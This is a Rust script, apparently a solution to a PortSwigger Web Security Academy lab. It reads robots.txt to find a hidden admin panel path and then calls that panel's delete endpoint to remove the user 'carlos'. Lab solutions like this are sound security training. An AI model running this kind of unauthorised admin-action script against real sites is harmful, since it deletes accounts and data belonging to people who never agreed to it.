@@ -1,0 +1,108 @@
+/********************************************************************
+*
+* Author: Ahmed Elqalawii
+*
+* Date: 4/9/2023
+*
+* PortSwigger LAB:  Unprotected admin functionality
+*
+* Steps: 1. Fetch the /robots.txt file
+*        2. Get the admin panel hidden path
+*        3. Delete carlos
+*
+*********************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use regex::Regex;
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let url = "https://0a5500460411e8ec82ba9e3600a3008d.web-security-academy.net";
+    // build the client used in all subsequent requests
+    let client = build_client();
+
+    print!("{} ", "1. Fetching /robots.txt file..".white());
+    io::stdout().flush();
+    // fetch /robots.txt file
+    let get_robots = client
+        .get(format!("{url}/robots.txt"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to fetch /robots.txt file"));
+    println!("{}", "OK".green());
+
+    print!("{} ", "2. Extracting the hidden path..".white());
+    io::stdout().flush();
+    // get the body of the response and extract the hidden name
+    let body = get_robots.text().unwrap();
+    let hidden_path = capture_pattern("Disallow: (.*)", &body)
+        .expect(&format!("{}", "[!] Failed to extract the hidden path"));
+    println!("{} => {}", "OK".green(), hidden_path.yellow());
+
+    print!("{} ", "3. Fetching the admin panel..".white());
+    io::stdout().flush();
+    // fetch the admin panel
+    // this step in not necessary in the script, you can do step 4 directly
+    // it's only a must when solving the lab using the browser
+    let admin_panel = client
+        .get(format!("{url}{hidden_path}"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to fetch the admin panel"));
+    println!("{}", "OK".green());
+
+    print!("{} ", "4. Deleting carlos..".white());
+    io::stdout().flush();
+    // delete carlos
+    let delete_carlos = client
+        .get(format!("{url}{hidden_path}/delete?username=carlos"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to delete carlos"));
+    println!("{}", "OK".green());
+
+    println!(
+        "{} {}",
+        "[#] Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
+}
+
+/*******************************************************************
+ * Function used to build the client
+ * Return a client that will be used in all subsequent requests
+ ********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
+
+/********************************************
+* Function to capture a pattern form a text
+*********************************************/
+fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
+    let pattern = Regex::new(pattern).unwrap();
+    if let Some(text) = pattern.captures(text) {
+        Some(text.get(1).unwrap().as_str().to_string())
+    } else {
+        None
+    }
+}
